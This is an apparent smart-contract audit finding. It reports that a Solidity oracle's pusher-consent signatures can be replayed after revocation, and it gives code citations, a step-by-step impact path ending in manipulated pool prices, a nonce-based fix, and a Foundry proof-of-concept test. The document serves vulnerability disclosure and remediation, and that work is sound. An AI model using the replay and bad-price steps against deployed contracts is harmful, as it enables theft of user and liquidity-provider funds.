### Title
Pusher Delegation Signature Replay Within Deadline Window Allows Creator to Re-Establish Revoked Delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` in `CompressedOracleV1` contains no nonce or one-time-use mechanism for the pusher's EIP-191 consent signature. After a pusher calls `revokePusher()` to clear their `namespaceRemapping`, a creator can replay the identical signature — with the same deadline — to silently re-establish the delegation. This is the direct structural analog to the ERC20 Multiple Withdrawal Attack: just as a spender can front-run an `approve` change to spend both the old and new allowance, a creator can replay a pusher's consent signature to restore write authority over a namespace the pusher intended to abandon.

### Finding Description

`allowPushers` validates the pusher's EIP-191 signature over `(chainid, oracle_address, deadline, pusher, creator)` and unconditionally writes `namespaceRemapping[pusher] = msg.sender`:

```solidity
// CompressedOracle.sol L192-211
function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(pusher == ECDSA.recover(hash, signatures[i]));

    namespaceRemapping[pusher] = msg.sender;   // ← no check that pusher has not revoked
    emit PusherAuthorized(pusher, msg.sender);
}
```

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol L238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
```

There is no nonce, no used-signature registry, and no check that `namespaceRemapping[pusher] == address(0)` before overwriting. The signed consent is therefore replayable by the creator at any time before `deadline` expires, regardless of how many times the pusher has revoked.

The code comment acknowledges the deadline as the sole replay guard:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

But the deadline only bounds the replay window — it does not prevent replay within that window. A pusher who revokes at time T with a deadline of T+1 day remains re-delegatable for the full remaining 24 hours.

### Impact Explanation

**Bad-price execution path:**

1. Pusher P signs consent for creator A with `deadline = now + 1 day`.
2. Creator A calls `allowPushers(deadline, [P], [sig])` → `namespaceRemapping[P] = A`.
3. P's private key is compromised; P calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. Creator A (unaware of the compromise, or acting maliciously) calls `allowPushers(deadline, [P], [sig])` again with the identical signature → `namespaceRemapping[P] = A` is restored.
5. The attacker (holding P's key) calls the `fallback()` push path with a crafted slot word carrying a fresh timestamp and an attacker-controlled price within the `priceGuard` bounds.
6. The price lands in A's namespace (`feedIdOf(A, slotIndex, positionIndex)`).
7. The `AnchoredPriceProvider` reads the feed via `_readLeg(baseFeedId)`, passes staleness, spread, and guard checks, and returns the bad bid/ask to the pool.
8. The pool executes swaps at the corrupted price, causing direct loss of user principal or LP assets.

The `fallback()` push path applies only a monotonicity check (newer timestamp wins); it does not re-verify delegation consent at push time:

```solidity
// CompressedOracle.sol L315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
```

So once the delegation is re-established in step 4, every subsequent push by the attacker's key is accepted without further authorization checks.

### Likelihood Explanation

**Medium.** The attack requires:
- A pusher's key to be compromised (realistic for hot-wallet pushers).
- The creator to replay the old signature — either because they are unaware of the compromise or because they are acting adversarially.
- The attacker to push a price within `priceGuard` bounds and with a fresh timestamp.

The deadline window (which can be set to days or weeks in practice, as shown in the deployment script and tests) gives the attacker a substantial window to operate. The creator does not need to front-run anything; they can replay the signature at any point before the deadline.

### Recommendation

Add a per-pusher nonce to the consent signature and increment it on each successful `allowPushers` call (or on `revokePusher`). This makes every consent signature single-use:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;          // invalidate the used signature
namespaceRemapping[pusher] = msg.sender;

// In revokePusher:
pusherNonce[msg.sender]++;      // also invalidate any outstanding signatures
namespaceRemapping[msg.sender] = address(0);
```

Alternatively, follow the OpenZeppelin `increaseAllowance`/`decreaseAllowance` pattern: expose a `renewPusher` function that requires the pusher to be currently mapped (i.e., not revoked) before accepting a new signature, so revocation cannot be silently undone.

### Proof of Concept

```solidity
// Demonstrates that a creator can replay a pusher's consent signature
// after the pusher has called revokePusher(), re-establishing the delegation.

function testSignatureReplayAfterRevoke() public {
    uint256 deadline = block.timestamp + 1 days;

    // Step 1: pusher signs consent for creator
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 2: creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 3: pusher revokes (e.g., key compromised)
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 4: creator replays the SAME signature — succeeds, deadline still valid
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);  // no revert
    assertEq(oracle.namespaceRemapping(pusher), creator);  // delegation restored

    // Step 5: attacker (holding pusher key) pushes bad price into creator's namespace
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 badRaw = _packRaw(9_999_999, 5, 0);  // attacker-chosen price
    vm.prank(pusher);  // attacker uses compromised key
    (bool ok,) = address(oracle).call(_wordAt(0, 0, badRaw, tsMs));
    assertTrue(ok, "bad push accepted");

    // Bad price now lives in creator's namespace, reachable by any pool using this feed
    IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    assertEq(data.price, U64x32.decode(uint32(badRaw >> 16)));
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L236-243)
```text
    /// @notice Allows a pusher to self-revoke their delegation. After revocation the
    ///         wallet pushes into its OWN namespace again (the registrationless default).
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-316)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```
